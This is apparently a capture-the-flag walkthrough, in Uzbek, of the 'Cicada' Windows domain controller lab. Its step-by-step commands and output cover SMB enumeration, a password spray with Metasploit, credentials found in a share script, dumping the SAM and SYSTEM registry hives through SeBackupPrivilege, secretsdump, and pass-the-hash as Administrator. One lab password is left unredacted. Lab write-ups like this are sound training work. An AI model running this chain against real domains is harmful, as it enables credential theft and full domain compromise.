**1.  nmap bilan qaysi portlar ochiqligini ko'ramiz**
```bash
nmap -A -T4 -sVC -O 10.10.11.35 -v
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-09 17:47:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 1.449 days (since Sat Feb  8 05:02:56 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2025-02-09T17:48:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

**2.smbclient bilan Windows tizimlaridagi umumiy (shared) papkalarni ko'rdim va HR fayliga faqatgina kirib bo'larkan**
```bash
smbclient -L 10.10.11.35        
Password for [WORKGROUP\beksulton]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 

```

**3. `netexec`  dan User Enumeration qilishda foydalandim**

```bash
netexec smb 10.10.11.35 -u guest -p '' --rid-brute 
```

```bash
netexec smb 10.10.11.35 -u guest -p '' --rid-brute | grep "SidTypeUser" 
SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```
**4. `msfconsole` dan foydalanib parolni SMB loginni brute-force qildim**
```bash
msf6> use scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set rhost 10.10.11.35
msf6 auxiliary(scanner/smb/smb_login) > set smbpass [Redacted]
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE user.txt
msf6 auxiliary(scanner/smb/smb_login) > run
```
Natija
```bash
msf6 auxiliary(scanner/smb/smb_login) > run
[*] 10.10.11.35:445       - 10.10.11.35:445 - Starting SMB login bruteforce
[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\Administrator:Cicada$M6Corpb*@Lp#nZp!8',
[!] 10.10.11.35:445       - No active DB -- Credential data will not be saved!
[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\Guest:Cicada$M6Corpb*@Lp#nZp!8',
[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\krbtgt:Cicada$M6Corpb*@Lp#nZp!8',
[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8',
[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8',
[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8',
[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: '.\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8'
[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\david.orelious:Cicada$M6Corpb*@Lp#nZp!8',
[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8',
[*] 10.10.11.35:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.11.35:445       - Bruteforce completed, 1 credential was successful.
[*] 10.10.11.35:445       - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```
5.`netexec` bilan  `michael.wrightson` da bor bo'lgan fayl va papklarni ko'rdim
```bash
netexec smb 10.10.11.35 -u 'michael.wrightson' -p '[Redacted]' --users --rid-brute

SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.10.11.35     445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.35     445    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain
SMB         10.10.11.35     445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain
SMB         10.10.11.35     445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account
SMB         10.10.11.35     445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1
SMB         10.10.11.35     445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1
SMB         10.10.11.35     445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is [Redacted]
SMB         10.10.11.35     445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

**6.`david.orelious` ni passwordini topdim va u yordamida  backup file topdim**
```bash
smbclient \\\\10.10.11.35\\DEV -U 'david.orelious'  
```

```bash
└─$ smbclient \\\\10.10.11.35\\DEV -U 'david.orelious'
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 17:31:39 2024
  ..                                  D        0  Thu Mar 14 17:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 22:28:22 2024

		4168447 blocks of size 4096. 68116 blocks available
smb: \> 

```

**7. Backup faylni ichidan**
```bash
└─$ cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "[Redacted]" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

**8. Evil-Winrm bilan user flagni olamiz**
```bash
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p '[Redacted]'
```

**9. Privilege Escalation**
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**10.Bundan `SeBackupPrivilege` topdim va buni Chat-GPT bilan maslahatlashgan holda 
Sam va System nusxasini olsa bo'larkan va men oldim**
```bash
reg save hklm\sam ./sam.backup
reg save hklm\system ./system.backup
```

**11. `Evil-WinRM` yordamida o'zimni kompyuterimga oldim**
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download sam.backup

Info: Downloading C:\Users\emily.oscars.CICADA\Documents\sam.backup to sam.backup

Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download system.backup

Info: Downloading C:\Users\emily.oscars.CICADA\Documents\system.backup to system.backup

Info: Download successful!
```

**12. [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) yordamida ntlm hashini oldim**
```bash
secretsdump.py -sam sam.backup -system system.backup LOCAL
```

**13. Evil-Winrm bilan nt hashi orqali Administrator bo'lib kirdim va flagni oldim.**

```bash
evil-winrm -u Administrator -H [Redacted] -i ip
```
